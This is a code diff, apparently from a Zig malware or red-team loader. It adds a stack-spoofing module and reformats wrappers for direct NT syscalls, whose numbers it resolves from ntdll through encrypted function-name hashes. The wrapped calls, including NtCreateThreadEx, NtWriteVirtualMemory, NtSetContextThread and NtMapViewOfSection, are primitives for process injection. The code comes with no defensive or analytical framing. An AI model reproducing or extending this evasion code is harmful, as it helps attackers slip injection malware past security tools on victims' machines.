@@ -7,6 +7,7 @@ const config = @import("config");
 
 comptime {
     _ = @import("stubs.zig");
+    _ = @import("stack_spoof.zig");
 }
 
 pub export var ssn_NtAllocateVirtualMemory: u32 = 0;
@@ -191,17 +192,17 @@ pub fn resolve() bool {
     ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtQueryValueKey"), &ssn_NtQueryValueKey);
     ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSetInformationProcess"), &ssn_NtSetInformationProcess);
     ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSetInformationFile"), &ssn_NtSetInformationFile);
-ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtGetContextThread"), &ssn_NtGetContextThread);
-ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSetContextThread"), &ssn_NtSetContextThread);
-ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtOpenSection"), &ssn_NtOpenSection);
-ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtUnmapViewOfSection"), &ssn_NtUnmapViewOfSection);
-ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtCreateThreadEx"), &ssn_NtCreateThreadEx);
-ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtOpenProcess"), &ssn_NtOpenProcess);
-ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtResumeThread"), &ssn_NtResumeThread);
-ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSuspendThread"), &ssn_NtSuspendThread);
-ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtDeleteFile"), &ssn_NtDeleteFile);
-ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtFlushInstructionCache"), &ssn_NtFlushInstructionCache);
-return ok;
+    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtGetContextThread"), &ssn_NtGetContextThread);
+    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSetContextThread"), &ssn_NtSetContextThread);
+    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtOpenSection"), &ssn_NtOpenSection);
+    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtUnmapViewOfSection"), &ssn_NtUnmapViewOfSection);
+    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtCreateThreadEx"), &ssn_NtCreateThreadEx);
+    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtOpenProcess"), &ssn_NtOpenProcess);
+    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtResumeThread"), &ssn_NtResumeThread);
+    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSuspendThread"), &ssn_NtSuspendThread);
+    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtDeleteFile"), &ssn_NtDeleteFile);
+    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtFlushInstructionCache"), &ssn_NtFlushInstructionCache);
+    return ok;
 }
 
 pub fn resolveWin32u() bool {
@@ -212,45 +213,65 @@ pub fn resolveWin32u() bool {
 // ── Zig wrappers → extern stubs ──
 
 pub fn NtAllocateVirtualMemory(
-    ProcessHandle: types.HANDLE, BaseAddress: *types.PVOID, ZeroBits: types.ULONG,
-    RegionSize: *types.SIZE_T, AllocationType: types.ULONG, Protect: types.ULONG,
+    ProcessHandle: types.HANDLE,
+    BaseAddress: *types.PVOID,
+    ZeroBits: types.ULONG,
+    RegionSize: *types.SIZE_T,
+    AllocationType: types.ULONG,
+    Protect: types.ULONG,
 ) types.NTSTATUS {
     return @as(types.NTSTATUS, @intCast(NtAllocateVirtualMemory_stub(
-        @intFromPtr(ProcessHandle), @intFromPtr(BaseAddress), ZeroBits,
-        @intFromPtr(RegionSize), AllocationType, Protect,
+        @intFromPtr(ProcessHandle),
+        @intFromPtr(BaseAddress),
+        ZeroBits,
+        @intFromPtr(RegionSize),
+        AllocationType,
+        Protect,
     )));
 }
 
 pub fn NtProtectVirtualMemory(
-    ProcessHandle: types.HANDLE, BaseAddress: *types.PVOID,
-    NumberOfBytesToProtect: *types.SIZE_T, NewAccessProtection: types.ULONG,
+    ProcessHandle: types.HANDLE,
+    BaseAddress: *types.PVOID,
+    NumberOfBytesToProtect: *types.SIZE_T,
+    NewAccessProtection: types.ULONG,
     OldAccessProtection: *types.ULONG,
 ) types.NTSTATUS {
     return @as(types.NTSTATUS, @intCast(NtProtectVirtualMemory_stub(
-        @intFromPtr(ProcessHandle), @intFromPtr(BaseAddress),
-        @intFromPtr(NumberOfBytesToProtect), NewAccessProtection,
+        @intFromPtr(ProcessHandle),
+        @intFromPtr(BaseAddress),
+        @intFromPtr(NumberOfBytesToProtect),
+        NewAccessProtection,
         @intFromPtr(OldAccessProtection),
     )));
 }
 
 pub fn NtFreeVirtualMemory(
-    ProcessHandle: types.HANDLE, BaseAddress: *types.PVOID,
-    RegionSize: *types.SIZE_T, FreeType: types.ULONG,
+    ProcessHandle: types.HANDLE,
+    BaseAddress: *types.PVOID,
+    RegionSize: *types.SIZE_T,
+    FreeType: types.ULONG,
 ) types.NTSTATUS {
     return @as(types.NTSTATUS, @intCast(NtFreeVirtualMemory_stub(
-        @intFromPtr(ProcessHandle), @intFromPtr(BaseAddress),
-        @intFromPtr(RegionSize), FreeType,
+        @intFromPtr(ProcessHandle),
+        @intFromPtr(BaseAddress),
+        @intFromPtr(RegionSize),
+        FreeType,
     )));
 }
 
 pub fn NtWriteVirtualMemory(
-    ProcessHandle: types.HANDLE, BaseAddress: types.PVOID,
-    Buffer: types.PVOID, NumberOfBytesToWrite: types.SIZE_T,
+    ProcessHandle: types.HANDLE,
+    BaseAddress: types.PVOID,
+    Buffer: types.PVOID,
+    NumberOfBytesToWrite: types.SIZE_T,
     NumberOfBytesWritten: *types.SIZE_T,
 ) types.NTSTATUS {
     return @as(types.NTSTATUS, @intCast(NtWriteVirtualMemory_stub(
-        @intFromPtr(ProcessHandle), @intFromPtr(BaseAddress),
-        @intFromPtr(Buffer), NumberOfBytesToWrite,
+        @intFromPtr(ProcessHandle),
+        @intFromPtr(BaseAddress),
+        @intFromPtr(Buffer),
+        NumberOfBytesToWrite,
         @intFromPtr(NumberOfBytesWritten),
     )));
 }
@@ -260,61 +281,94 @@ pub fn NtClose(Handle: types.HANDLE) types.NTSTATUS {
 }
 
 pub fn NtOpenFile(
-    FileHandle: *types.HANDLE, DesiredAccess: types.ULONG,
-    ObjectAttributes: types.PVOID, IoStatusBlock: types.PVOID,
-    ShareAccess: types.ULONG, OpenOptions: types.ULONG,
+    FileHandle: *types.HANDLE,
+    DesiredAccess: types.ULONG,
+    ObjectAttributes: types.PVOID,
+    IoStatusBlock: types.PVOID,
+    ShareAccess: types.ULONG,
+    OpenOptions: types.ULONG,
 ) types.NTSTATUS {
     return @as(types.NTSTATUS, @intCast(NtOpenFile_stub(
-        @intFromPtr(FileHandle), DesiredAccess, @intFromPtr(ObjectAttributes),
-        @intFromPtr(IoStatusBlock), ShareAccess, OpenOptions,
+        @intFromPtr(FileHandle),
+        DesiredAccess,
+        @intFromPtr(ObjectAttributes),
+        @intFromPtr(IoStatusBlock),
+        ShareAccess,
+        OpenOptions,
     )));
 }
 
 pub fn NtReadVirtualMemory(
-    ProcessHandle: types.HANDLE, BaseAddress: types.PVOID,
-    Buffer: types.PVOID, NumberOfBytesToRead: types.SIZE_T,
+    ProcessHandle: types.HANDLE,
+    BaseAddress: types.PVOID,
+    Buffer: types.PVOID,
+    NumberOfBytesToRead: types.SIZE_T,
     NumberOfBytesRead: *types.SIZE_T,
 ) types.NTSTATUS {
     return @as(types.NTSTATUS, @intCast(NtReadVirtualMemory_stub(
-        @intFromPtr(ProcessHandle), @intFromPtr(BaseAddress),
-        @intFromPtr(Buffer), NumberOfBytesToRead,
+        @intFromPtr(ProcessHandle),
+        @intFromPtr(BaseAddress),
+        @intFromPtr(Buffer),
+        NumberOfBytesToRead,
         @intFromPtr(NumberOfBytesRead),
     )));
 }
 
 pub fn NtCreateSection(
-    SectionHandle: *types.HANDLE, DesiredAccess: types.ULONG,
-    ObjectAttributes: types.PVOID, MaximumSize: types.PVOID,
-    SectionPageProtection: types.ULONG, AllocationAttributes: types.ULONG,
+    SectionHandle: *types.HANDLE,
+    DesiredAccess: types.ULONG,
+    ObjectAttributes: types.PVOID,
+    MaximumSize: types.PVOID,
+    SectionPageProtection: types.ULONG,
+    AllocationAttributes: types.ULONG,
     FileHandle: types.HANDLE,
 ) types.NTSTATUS {
     return @as(types.NTSTATUS, @intCast(NtCreateSection_stub(
-        @intFromPtr(SectionHandle), DesiredAccess, @intFromPtr(ObjectAttributes),
-        @intFromPtr(MaximumSize), SectionPageProtection, AllocationAttributes,
+        @intFromPtr(SectionHandle),
+        DesiredAccess,
+        @intFromPtr(ObjectAttributes),
+        @intFromPtr(MaximumSize),
+        SectionPageProtection,
+        AllocationAttributes,
         @intFromPtr(FileHandle),
     )));
 }
 
 pub fn NtMapViewOfSection(
-    SectionHandle: types.HANDLE, ProcessHandle: types.HANDLE,
-    BaseAddress: *types.PVOID, ZeroBits: types.ULONG,
-    CommitSize: types.SIZE_T, SectionOffset: types.PVOID,
-    ViewSize: *types.SIZE_T, InheritDisposition: types.ULONG,
-    _: types.ULONG, _: types.ULONG,
+    SectionHandle: types.HANDLE,
+    ProcessHandle: types.HANDLE,
+    BaseAddress: *types.PVOID,
+    ZeroBits: types.ULONG,
+    CommitSize: types.SIZE_T,
+    SectionOffset: types.PVOID,
+    ViewSize: *types.SIZE_T,
+    InheritDisposition: types.ULONG,
+    _: types.ULONG,
+    _: types.ULONG,
 ) types.NTSTATUS {
     return @as(types.NTSTATUS, @intCast(NtMapViewOfSection_stub(
-        @intFromPtr(SectionHandle), @intFromPtr(ProcessHandle),
-        @intFromPtr(BaseAddress), ZeroBits, CommitSize,
-        @intFromPtr(SectionOffset), @intFromPtr(ViewSize),
-        InheritDisposition, 0, 0,
+        @intFromPtr(SectionHandle),
+        @intFromPtr(ProcessHandle),
+        @intFromPtr(BaseAddress),
+        ZeroBits,
+        CommitSize,
+        @intFromPtr(SectionOffset),
+        @intFromPtr(ViewSize),
+        InheritDisposition,
+        0,
+        0,
     )));
 }
 
 pub fn NtWriteFile(
-    FileHandle: types.HANDLE, Event: types.HANDLE,
-    ApcRoutine: ?*const anyopaque, ApcContext: ?*const anyopaque,
-    IoStatusBlock: types.PVOID, Buffer: types.PVOID,
-    Length: types.ULONG, ByteOffset: ?*const anyopaque,
+    FileHandle: types.HANDLE,
+    Event: types.HANDLE,
+    ApcRoutine: ?*const anyopaque,
+    ApcContext: ?*const anyopaque,
+    IoStatusBlock: types.PVOID,
+    Buffer: types.PVOID,
+    Length: types.ULONG,
+    ByteOffset: ?*const anyopaque,
     Key: ?*const anyopaque,
 ) types.NTSTATUS {
     const apc_routine = if (ApcRoutine) |p| @intFromPtr(p) else 0;
@@ -322,38 +376,60 @@ pub fn NtWriteFile(
     const byte_off = if (ByteOffset) |p| @intFromPtr(p) else 0;
     const key = if (Key) |p| @intFromPtr(p) else 0;
     return @as(types.NTSTATUS, @intCast(NtWriteFile_stub(
-        @intFromPtr(FileHandle), @intFromPtr(Event), apc_routine,
-        apc_context, @intFromPtr(IoStatusBlock), @intFromPtr(Buffer),
-        Length, byte_off, key,
+        @intFromPtr(FileHandle),
+        @intFromPtr(Event),
+        apc_routine,
+        apc_context,
+        @intFromPtr(IoStatusBlock),
+        @intFromPtr(Buffer),
+        Length,
+        byte_off,
+        key,
     )));
 }
 
 pub fn NtCreateFile(
-    FileHandle: *types.HANDLE, DesiredAccess: types.ULONG,
-    ObjectAttributes: types.PVOID, IoStatusBlock: types.PVOID,
-    AllocationSize: ?*const anyopaque, FileAttributes: types.ULONG,
-    ShareAccess: types.ULONG, CreateDisposition: types.ULONG,
-    CreateOptions: types.ULONG, EaBuffer: ?*const anyopaque,
+    FileHandle: *types.HANDLE,
+    DesiredAccess: types.ULONG,
+    ObjectAttributes: types.PVOID,
+    IoStatusBlock: types.PVOID,
+    AllocationSize: ?*const anyopaque,
+    FileAttributes: types.ULONG,
+    ShareAccess: types.ULONG,
+    CreateDisposition: types.ULONG,
+    CreateOptions: types.ULONG,
+    EaBuffer: ?*const anyopaque,
     EaLength: types.ULONG,
 ) types.NTSTATUS {
     const alloc_size = if (AllocationSize) |p| @intFromPtr(p) else 0;
     const ea_buf = if (EaBuffer) |p| @intFromPtr(p) else 0;
     return @as(types.NTSTATUS, @intCast(NtCreateFile_stub(
-        @intFromPtr(FileHandle), DesiredAccess, @intFromPtr(ObjectAttributes),
-        @intFromPtr(IoStatusBlock), alloc_size, FileAttributes,
-        ShareAccess, CreateDisposition, CreateOptions,
-        ea_buf, EaLength,
+        @intFromPtr(FileHandle),
+        DesiredAccess,
+        @intFromPtr(ObjectAttributes),
+        @intFromPtr(IoStatusBlock),
+        alloc_size,
+        FileAttributes,
+        ShareAccess,
+        CreateDisposition,
+        CreateOptions,
+        ea_buf,
+        EaLength,
     )));
 }
 
 pub fn NtQueryInformationProcess(
-    ProcessHandle: types.HANDLE, ProcessInformationClass: types.ULONG,
-    ProcessInformation: types.PVOID, ProcessInformationLength: types.ULONG,
+    ProcessHandle: types.HANDLE,
+    ProcessInformationClass: types.ULONG,
+    ProcessInformation: types.PVOID,
+    ProcessInformationLength: types.ULONG,
     ReturnLength: *types.ULONG,
 ) types.NTSTATUS {
     return @as(types.NTSTATUS, @intCast(NtQueryInformationProcess_stub(
-        @intFromPtr(ProcessHandle), ProcessInformationClass,
-        @intFromPtr(ProcessInformation), ProcessInformationLength,
+        @intFromPtr(ProcessHandle),
+        ProcessInformationClass,
+        @intFromPtr(ProcessInformation),
+        ProcessInformationLength,
         @intFromPtr(ReturnLength),
     )));
 }
